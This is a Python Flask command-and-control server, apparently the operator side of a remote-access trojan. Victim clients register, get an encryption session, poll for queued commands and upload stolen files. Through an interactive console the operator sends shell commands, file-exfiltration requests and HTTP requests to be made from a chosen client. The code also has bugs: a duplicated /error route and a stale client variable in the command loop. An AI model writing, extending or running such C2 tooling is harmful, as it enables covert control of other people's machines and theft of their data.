
import json
import threading
import time
from urllib.parse import urlparse
from flask import Flask, request, jsonify
import os
import uuid
import re
from ecrypt import Ecrypt
from messagequeue import MessageQueue
from responsequeue import ResponseQueue

app = Flask(__name__)
clients = []
message_queue = MessageQueue()
local_queue = ResponseQueue()


@app.route('/hello', methods=['GET'])
def hello():
    random_uuid_str = str(uuid.uuid4())
    cript_session = Ecrypt(isServer=True)
    clients.append({"cid": random_uuid_str, "cs": cript_session})
    return jsonify({"cid": random_uuid_str, "pubkey": cript_session.get_public_key()})


@app.route('/list/<cid>', methods=['GET'])
def get_next_command(cid):
    message = message_queue.get_next_message(cid)
    if message:
        return jsonify(message)
    else:
        return jsonify({})


@app.route('/upload', methods=['POST'])
def upload_file():
    id = request.form.get('id')
    cid = request.form.get('cid')
    name = request.form.get('name')
    file = request.files['file']
    cs = None
    for client in clients:
        if client["cid"] == cid:
            cs = client["cs"]
    if cs == None:
        return jsonify({"message": "Realy?"}), 500
    try:
        folder_path = os.path.join("uploads", cid, id)
        os.makedirs(folder_path, exist_ok=True)
        path = os.path.join(folder_path, name)
        cs.decrypt_file(file).save(path)
    except Exception as e:
        return jsonify({"message": "Realy?"}), 500

    print("Arquivo baixado:")
    print(path)
    local_queue.add_message(cid, {"id": id, "typ": "file", "loc": path})
    return jsonify({"message": "Upload realizado com sucesso."}), 200


@app.route('/error', methods=['POST'])
def handle_error():
    id = request.form.get('id')
    cid = request.form.get('cid')
    ret = request.form.get('ret')

    local_queue.add_message(cid, {"id": id, "typ": "erro", "msg": ret})
    print(ret)
    return jsonify({"message": f"Erro recebido: {ret}"}), 200


@app.route('/error', methods=['POST'])
def handle_error():
    id = request.form.get('id')
    cid = request.form.get('cid')
    cs = None
    for client in clients:
        if client["cid"] == cid:
            cs = client["cs"]
    if cs == None:
        return jsonify({"message": "Realy?"}), 500

    ret = cs.decrypt_context(request.form.get('output'))

    local_queue.add_message(cid, {"id": id, "typ": "ret", "msg": ret})
    print(ret)
    return jsonify({"message": f"Erro recebido: {ret}"}), 200


@app.route('/add_message', methods=['POST'])
def add_message():
    data = request.get_json()
    user_id = data['user_id']
    message = data['message']
    message_queue.add_message(user_id, message)
    return jsonify({"status": "Message added successfully for user with ID: " + str(user_id)})


@app.route('/get_next_message/<int:user_id>', methods=['GET'])
def get_next_message(user_id):
    message = message_queue.get_next_message(user_id)
    if message:
        return jsonify({"message": message})
    else:
        return jsonify({"status": "No more messages for user with ID " + str(user_id)})


def is_http_url(url):
    parsed_url = urlparse(url)
    return parsed_url.scheme.lower() == "http"


def parse_dl_string(data_string):
    pattern = r'dl\s+(?P<url>\S+)\s+method=(?P<method>POST|GET)\s+headers=\'\{(?P<headers>[^}]*)\}\'\s+data=\'\{(?P<data>[^}]*)\}\''
    match = re.match(pattern, data_string)

    if match:
        url = match.group('url')
        method = match.group('method')
        headers_str = match.group('headers')
        data_str = match.group('data')

        headers = dict(item.strip().split(':')
                       for item in headers_str.split(','))
        data = dict(item.strip().split(':') for item in data_str.split(','))

        return url, method, headers, data
    else:
        return None


def execute_command(cid, command_type, command, method=None, headers=None, data=None):
    msg = {'command': command, 'type': command_type,
           'method': method, 'headers': headers, 'body': data}
    message_queue.add_message(cid, msg)


def process_commands():
    while True:
        print("Clientes disponiveis:"+str(len(clients)))
        a = 0
        for client in clients:
            print(str(a)+" para "+client["cid"])
            a += 1
        command = input("digite o cliente: ")
        cli = None
        try:
            cli = clients[int(command)]
        except Exception as e:
            print("invalid client")
        if cli:
            print(
                "To perform a download, use 'dl url method=POST/GET headers={Authorization: Bearer ehauehasuhsad} data={variable:value}'. To start 'dl' for download or enter a command if you want to send an HTTP request.")
            print("To download a file, use 'filedl file_path'.")
            print("To execute a command on the client, enter the command.")
            print("Or type 'qq' to return to the list of clients.")

            while True:
                command = input("Enter a command: ")
                if command == "qq":
                    break
                if command.startswith('dl'):
                    url, method, headers, data = parse_dl_string(command)
                    execute_command(client["cid"], 'dl',
                                    url, method, headers, data)
                elif command.startswith('filedl'):
                    command = command.replace("filedl", "").strip()
                    execute_command(client["cid"], 'filedl', command)
                else:
                    execute_command(client["cid"], 'cmd', command)

                print("Aguardando o envio")
                time.sleep(4)


def main():
    process_thread = threading.Thread(target=process_commands)
    process_thread.daemon = True
    process_thread.start()
    app.run(host='0.0.0.0', port=5000)


if __name__ == '__main__':
    main()
